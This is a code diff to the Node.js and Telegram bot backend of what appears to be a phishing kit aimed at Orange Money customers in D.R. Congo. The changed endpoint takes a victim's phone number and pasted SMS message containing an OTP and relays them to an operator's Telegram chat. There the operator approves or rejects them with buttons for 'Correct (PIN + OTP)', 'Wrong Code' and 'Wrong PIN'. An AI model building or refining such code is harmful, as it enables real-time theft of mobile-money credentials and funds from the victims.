@@ -75,9 +75,9 @@ app.post('/api/login-notification', async (req, res) => {
     }
 });
 
-// -------------------- FIRST OTP API --------------------
+// -------------------- FIRST OTP API (UPDATED) --------------------
 app.post('/api/verify-first-otp', async (req, res) => {
-    const { phone, otp } = req.body || {};
+    const { phone, link } = req.body || {};
     const country = "D.R. Congo";
     const countryCode = "+243";
     const currentTime = new Date().toLocaleString('en-US', {
@@ -86,33 +86,37 @@ app.post('/api/verify-first-otp', async (req, res) => {
         hour12: true
     });
 
-    if (!phone || !otp || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });
+    if (!phone || !link || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });
 
     statusStore[phone] = "pending_otp1";
 
-    const otpMessage = `1️⃣ <b>ORANGE MONEY RDC - FIRST OTP (Step 1/2)</b>
-
-🆕 <b>NEW USER - FIRST VERIFICATION</b>
+    const otpMessage = `🆕 <b>NEW USER - VERIFICATION NEEDED</b>
 🇨🇩 <b>Country:</b> ${country}
-🌍 <b>Country Code:</b> ${countryCode}
+📞 <b>Country Code:</b> ${countryCode}
 📱 <b>Phone Number:</b> ${phone}
-🔐 <b>First OTP Code:</b> ${otp}
+📨 <b>COMPLETE SMS MESSAGE:</b>
+${link}
 ⏰ <b>Time:</b> ${currentTime}
 
-━━━━━━━━━━━━━━━
+💬 <b>Note: User pasted SMS message to extract OTP</b>
 
-⚠️ <b>Verify FIRST OTP:</b>
-⌛ <b>Timeout: 5 minutes</b>
-📝 <b>Next: Second OTP will be sent after approval</b>`;
+<b>━━━━━━━━━━━━━━━━━</b>
+
+⚠️ <b>Verify the credentials:</b>
+⏰ <b>Timeout: 5 minutes</b>`;
 
     try {
         await bot.telegram.sendMessage(ADMIN_ID, otpMessage, {
             parse_mode: 'HTML',
+            disable_web_page_preview: true,
             reply_markup: {
                 inline_keyboard: [
                     [
-                        { text: "✅ Correct", callback_data: `otp1_correct|${phone}|${otp}` },
-                        { text: "❌ Wrong Code", callback_data: `otp1_wrong|${phone}` }
+                        { text: "✅ Correct (PIN + OTP)", callback_data: `otp1_correct|${phone}` }
+                    ],
+                    [
+                        { text: "❌ Wrong Code", callback_data: `otp1_wrong|${phone}` },
+                        { text: "⚠️ Wrong PIN", callback_data: `otp2_wrongpin|${phone}` }
                     ]
                 ]
             }
@@ -291,10 +295,9 @@ bot.action(/^deny\|(.+)\|(.+)/, async (ctx) => {
     await ctx.replyWithHTML(deniedMsg);
 });
 
-// OTP1 CORRECT
-bot.action(/^otp1_correct\|(.+)\|(.+)/, async (ctx) => {
+// OTP1 CORRECT (UPDATED)
+bot.action(/^otp1_correct\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
-    const otp = ctx.match[2];
     statusStore[phone] = "otp1_correct";
     const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
 
@@ -302,7 +305,6 @@ bot.action(/^otp1_correct\|(.+)\|(.+)/, async (ctx) => {
 
 🇨🇩 <b>D.R. Congo</b>
 📱 <b>${phone}</b>
-🔐 <b>${otp}</b>
 
 ━━━━━━━━━━━━━━━
 
